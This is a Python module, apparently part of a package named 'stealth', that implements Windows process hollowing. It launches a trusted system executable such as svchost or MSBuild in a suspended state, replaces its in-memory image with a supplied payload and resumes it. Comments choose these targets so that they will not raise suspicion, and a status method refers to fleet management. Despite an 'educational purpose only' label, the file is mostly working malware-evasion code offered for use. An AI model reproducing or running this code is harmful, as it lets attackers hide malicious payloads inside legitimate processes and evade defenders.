"""
Process Hollowing — inject payload into a legitimate process image.

Creates a suspended legitimate Windows process, unmaps its original
image, writes the payload into the hollowed address space, adjusts the
thread context to point at the new entry-point, and resumes execution.
The result is a running process whose on-disk image is legitimate but
whose in-memory code is the provided payload.

Windows-only.  Requires ctypes access to kernel32 and ntdll.

Usage::

    from stealth.process_hollowing import ProcessHollower

    hollower = ProcessHollower()
    target = hollower.find_suitable_target()
    hollower.hollow(target, payload_bytes)

EDUCATIONAL PURPOSE ONLY.
"""
from __future__ import annotations

import ctypes
import ctypes.wintypes as wintypes
import logging
import os
import platform
import struct
from typing import Any

logger = logging.getLogger(__name__)

# ── Platform guard ────────────────────────────────────────────────────

_IS_WINDOWS = platform.system().lower() == "windows"

# ── Windows constants ─────────────────────────────────────────────────

CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x001FFFFF
CONTEXT_FULL = 0x10000B

# PE header offsets
IMAGE_DOS_SIGNATURE = 0x5A4D  # "MZ"
PE_SIGNATURE_OFFSET = 0x3C
IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B


# ── ctypes structures ────────────────────────────────────────────────

if _IS_WINDOWS:
    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ("cb",              wintypes.DWORD),
            ("lpReserved",      wintypes.LPWSTR),
            ("lpDesktop",       wintypes.LPWSTR),
            ("lpTitle",         wintypes.LPWSTR),
            ("dwX",             wintypes.DWORD),
            ("dwY",             wintypes.DWORD),
            ("dwXSize",         wintypes.DWORD),
            ("dwYSize",         wintypes.DWORD),
            ("dwXCountChars",   wintypes.DWORD),
            ("dwYCountChars",   wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags",         wintypes.DWORD),
            ("wShowWindow",     wintypes.WORD),
            ("cbReserved2",     wintypes.WORD),
            ("lpReserved2",     ctypes.POINTER(ctypes.c_byte)),
            ("hStdInput",       wintypes.HANDLE),
            ("hStdOutput",      wintypes.HANDLE),
            ("hStdError",       wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess",    wintypes.HANDLE),
            ("hThread",     wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId",  wintypes.DWORD),
        ]

    class CONTEXT64(ctypes.Structure):
        """Minimal x86-64 CONTEXT for Rcx (entry point) and Rdx (PEB)."""
        _fields_ = [
            ("P1Home",             ctypes.c_ulonglong),
            ("P2Home",             ctypes.c_ulonglong),
            ("P3Home",             ctypes.c_ulonglong),
            ("P4Home",             ctypes.c_ulonglong),
            ("P5Home",             ctypes.c_ulonglong),
            ("P6Home",             ctypes.c_ulonglong),
            ("ContextFlags",       wintypes.DWORD),
            ("MxCsr",              wintypes.DWORD),
            ("SegCs",              wintypes.WORD),
            ("SegDs",              wintypes.WORD),
            ("SegEs",              wintypes.WORD),
            ("SegFs",              wintypes.WORD),
            ("SegGs",              wintypes.WORD),
            ("SegSs",              wintypes.WORD),
            ("EFlags",             wintypes.DWORD),
            ("Dr0",                ctypes.c_ulonglong),
            ("Dr1",                ctypes.c_ulonglong),
            ("Dr2",                ctypes.c_ulonglong),
            ("Dr3",                ctypes.c_ulonglong),
            ("Dr6",                ctypes.c_ulonglong),
            ("Dr7",                ctypes.c_ulonglong),
            ("Rax",                ctypes.c_ulonglong),
            ("Rcx",                ctypes.c_ulonglong),
            ("Rdx",                ctypes.c_ulonglong),
            ("Rbx",                ctypes.c_ulonglong),
            ("Rsp",                ctypes.c_ulonglong),
            ("Rbp",                ctypes.c_ulonglong),
            ("Rsi",                ctypes.c_ulonglong),
            ("Rdi",                ctypes.c_ulonglong),
            ("R8",                 ctypes.c_ulonglong),
            ("R9",                 ctypes.c_ulonglong),
            ("R10",                ctypes.c_ulonglong),
            ("R11",                ctypes.c_ulonglong),
            ("R12",                ctypes.c_ulonglong),
            ("R13",                ctypes.c_ulonglong),
            ("R14",                ctypes.c_ulonglong),
            ("R15",                ctypes.c_ulonglong),
            ("Rip",                ctypes.c_ulonglong),
            # XMM / floating-point area omitted (not needed for hollowing)
            ("_padding",           ctypes.c_byte * 512),
        ]

# ── Suitable target executables ───────────────────────────────────────
# Legitimate system / .NET processes that are commonly running and
# whose presence will not raise suspicion.

_CANDIDATE_TARGETS = [
    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe",
    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe",
    r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe",
    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\RuntimeBroker.exe",
    r"C:\Windows\System32\dllhost.exe",
]


class ProcessHollower:
    """Hollow a legitimate Windows process and inject a payload.

    Attributes
    ----------
    _process_info : PROCESS_INFORMATION | None
        Handle to the created (suspended) process; populated after
        :meth:`hollow` and cleared on cleanup.
    """

    def __init__(self) -> None:
        self._process_info: Any = None
        self._hollowed = False

    # ── Public API ───────────────────────────────────────────────────

    @staticmethod
    def find_suitable_target() -> str:
        """Return the path to a suitable hollowing target on this system.

        Searches the candidate list for an existing, readable executable.
        Returns the first match, or falls back to ``svchost.exe``.

        Returns
        -------
        str
            Absolute path to a system executable suitable for hollowing.
        """
        if not _IS_WINDOWS:
            logger.warning("Process hollowing is Windows-only; returning dummy path")
            return "/usr/bin/false"

        for candidate in _CANDIDATE_TARGETS:
            if os.path.isfile(candidate):
                logger.debug("Selected hollowing target: %s", candidate)
                return candidate

        # Ultimate fallback
        fallback = r"C:\Windows\System32\svchost.exe"
        logger.debug("Falling back to hollowing target: %s", fallback)
        return fallback

    def hollow(self, target_exe: str, payload: bytes) -> bool:
        """Hollow *target_exe* and inject *payload*.

        Steps
        -----
        1. Create the target process in a **suspended** state.
        2. Read its PEB to find the image base address.
        3. Unmap the original image (``NtUnmapViewOfSection``).
        4. Allocate memory at the image base with RWX permissions.
        5. Write the payload PE into the allocated memory.
        6. Update the thread context entry-point to the payload's
           ``AddressOfEntryPoint``.
        7. Resume the primary thread.

        Parameters
        ----------
        target_exe : str
            Path to the legitimate executable to hollow.
        payload : bytes
            A valid PE file to inject.

        Returns
        -------
        bool
            ``True`` if injection and resume succeeded.
        """
        if not _IS_WINDOWS:
            logger.info("Process hollowing skipped (not Windows)")
            return False

        if not os.path.isfile(target_exe):
            logger.error("Target executable not found: %s", target_exe)
            return False

        if len(payload) < 64 or struct.unpack_from("<H", payload, 0)[0] != IMAGE_DOS_SIGNATURE:
            logger.error("Payload is not a valid PE file (bad MZ header)")
            return False

        kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
        ntdll = ctypes.windll.ntdll  # type: ignore[attr-defined]

        try:
            # ── Step 1: Create suspended process ──────────────────
            si = STARTUPINFOW()
            si.cb = ctypes.sizeof(STARTUPINFOW)
            pi = PROCESS_INFORMATION()

            success = kernel32.CreateProcessW(
                target_exe,        # lpApplicationName
                None,              # lpCommandLine
                None,              # lpProcessAttributes
                None,              # lpThreadAttributes
                False,             # bInheritHandles
                CREATE_SUSPENDED,  # dwCreationFlags
                None,              # lpEnvironment
                None,              # lpCurrentDirectory
                ctypes.byref(si),
                ctypes.byref(pi),
            )
            if not success:
                err = ctypes.get_last_error()
                logger.error("CreateProcessW failed (error %d)", err)
                return False

            self._process_info = pi
            logger.debug(
                "Created suspended process PID=%d TID=%d",
                pi.dwProcessId, pi.dwThreadId,
            )

            # ── Step 2: Get thread context (Rdx → PEB) ───────────
            ctx = CONTEXT64()
            ctx.ContextFlags = CONTEXT_FULL
            if not kernel32.GetThreadContext(pi.hThread, ctypes.byref(ctx)):
                logger.error("GetThreadContext failed")
                self._cleanup(pi)
                return False

            # PEB address is in Rdx for 64-bit processes
            peb_address = ctx.Rdx

            # Read ImageBaseAddress from PEB (offset 0x10 on x64)
            image_base_addr = ctypes.c_ulonglong(0)
            bytes_read = ctypes.c_size_t(0)
            kernel32.ReadProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(peb_address + 0x10),
                ctypes.byref(image_base_addr),
                ctypes.sizeof(image_base_addr),
                ctypes.byref(bytes_read),
            )
            original_base = image_base_addr.value
            logger.debug("Original image base: 0x%x", original_base)

            # ── Step 3: Unmap original image ─────────────────────
            status = ntdll.NtUnmapViewOfSection(
                pi.hProcess,
                ctypes.c_void_p(original_base),
            )
            if status != 0:
                logger.warning(
                    "NtUnmapViewOfSection returned NTSTATUS 0x%08x", status,
                )
                # Continue anyway — some Windows versions allow re-mapping

            # ── Step 4: Parse payload PE headers ─────────────────
            pe_offset = struct.unpack_from("<I", payload, PE_SIGNATURE_OFFSET)[0]
            # Skip "PE\0\0" (4 bytes) + IMAGE_FILE_HEADER (20 bytes) to Optional Header
            opt_hdr_offset = pe_offset + 4 + 20
            opt_magic = struct.unpack_from("<H", payload, opt_hdr_offset)[0]

            if opt_magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
                image_size = struct.unpack_from("<I", payload, opt_hdr_offset + 56)[0]
                entry_rva = struct.unpack_from("<I", payload, opt_hdr_offset + 16)[0]
                preferred_base = struct.unpack_from("<Q", payload, opt_hdr_offset + 24)[0]
            elif opt_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC:
                image_size = struct.unpack_from("<I", payload, opt_hdr_offset + 56)[0]
                entry_rva = struct.unpack_from("<I", payload, opt_hdr_offset + 16)[0]
                preferred_base = struct.unpack_from("<I", payload, opt_hdr_offset + 28)[0]
            else:
                logger.error("Unknown PE optional header magic: 0x%x", opt_magic)
                self._cleanup(pi)
                return False

            # ── Step 5: Allocate memory in target ────────────────
            alloc_base = kernel32.VirtualAllocEx(
                pi.hProcess,
                ctypes.c_void_p(preferred_base),
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
            if not alloc_base:
                # Retry at any address
                alloc_base = kernel32.VirtualAllocEx(
                    pi.hProcess,
                    None,
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                )
            if not alloc_base:
                logger.error("VirtualAllocEx failed")
                self._cleanup(pi)
                return False

            logger.debug("Allocated 0x%x bytes at 0x%x", image_size, alloc_base)

            # ── Step 6: Write payload headers ────────────────────
            bytes_written = ctypes.c_size_t(0)

            # Write PE headers (up to SizeOfHeaders)
            if opt_magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
                headers_size = struct.unpack_from("<I", payload, opt_hdr_offset + 60)[0]
            else:
                headers_size = struct.unpack_from("<I", payload, opt_hdr_offset + 60)[0]

            header_buf = (ctypes.c_char * headers_size).from_buffer_copy(
                payload[:headers_size]
            )
            kernel32.WriteProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(alloc_base),
                header_buf,
                headers_size,
                ctypes.byref(bytes_written),
            )

            # Write each section
            file_hdr_offset = pe_offset + 4
            num_sections = struct.unpack_from("<H", payload, file_hdr_offset + 2)[0]
            opt_hdr_size = struct.unpack_from("<H", payload, file_hdr_offset + 16)[0]
            section_offset = opt_hdr_offset + opt_hdr_size

            for i in range(num_sections):
                s_off = section_offset + (i * 40)
                virtual_addr = struct.unpack_from("<I", payload, s_off + 12)[0]
                raw_size = struct.unpack_from("<I", payload, s_off + 16)[0]
                raw_ptr = struct.unpack_from("<I", payload, s_off + 20)[0]

                if raw_size == 0:
                    continue

                section_data = (ctypes.c_char * raw_size).from_buffer_copy(
                    payload[raw_ptr: raw_ptr + raw_size]
                )
                kernel32.WriteProcessMemory(
                    pi.hProcess,
                    ctypes.c_void_p(alloc_base + virtual_addr),
                    section_data,
                    raw_size,
                    ctypes.byref(bytes_written),
                )

            logger.debug("Wrote %d sections to target process", num_sections)

            # ── Step 7: Update PEB ImageBaseAddress ──────────────
            new_base = ctypes.c_ulonglong(alloc_base)
            kernel32.WriteProcessMemory(
                pi.hProcess,
                ctypes.c_void_p(peb_address + 0x10),
                ctypes.byref(new_base),
                ctypes.sizeof(new_base),
                ctypes.byref(bytes_written),
            )

            # ── Step 8: Set thread context entry point ───────────
            ctx.Rcx = alloc_base + entry_rva
            if not kernel32.SetThreadContext(pi.hThread, ctypes.byref(ctx)):
                logger.error("SetThreadContext failed")
                self._cleanup(pi)
                return False

            # ── Step 9: Resume execution ─────────────────────────
            if kernel32.ResumeThread(pi.hThread) == -1:
                logger.error("ResumeThread failed")
                self._cleanup(pi)
                return False

            self._hollowed = True
            logger.info(
                "Process hollowing complete: PID=%d entry=0x%x",
                pi.dwProcessId, alloc_base + entry_rva,
            )

            # Close our handles (process keeps running)
            kernel32.CloseHandle(pi.hThread)
            kernel32.CloseHandle(pi.hProcess)
            self._process_info = None
            return True

        except Exception as exc:
            logger.error("Process hollowing failed: %s", exc, exc_info=True)
            if self._process_info:
                self._cleanup(self._process_info)
            return False

    # ── Cleanup ──────────────────────────────────────────────────────

    def _cleanup(self, pi: Any) -> None:
        """Terminate the suspended process and close handles.

        Called on failure to avoid leaving a zombie suspended process.
        """
        if not _IS_WINDOWS:
            return
        try:
            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            kernel32.TerminateProcess(pi.hProcess, 1)
            kernel32.CloseHandle(pi.hThread)
            kernel32.CloseHandle(pi.hProcess)
            logger.debug("Cleaned up suspended process PID=%d", pi.dwProcessId)
        except Exception as exc:
            logger.debug("Cleanup failed: %s", exc)
        self._process_info = None

    # ── Diagnostics ──────────────────────────────────────────────────

    @property
    def is_hollowed(self) -> bool:
        """Whether a successful hollowing has been performed."""
        return self._hollowed

    def get_status(self) -> dict[str, Any]:
        """Return module status for dashboards / fleet management."""
        return {
            "available": _IS_WINDOWS,
            "hollowed": self._hollowed,
        }

    def __repr__(self) -> str:
        state = "hollowed" if self._hollowed else "idle"
        return f"<ProcessHollower ({state}, windows={_IS_WINDOWS})>"
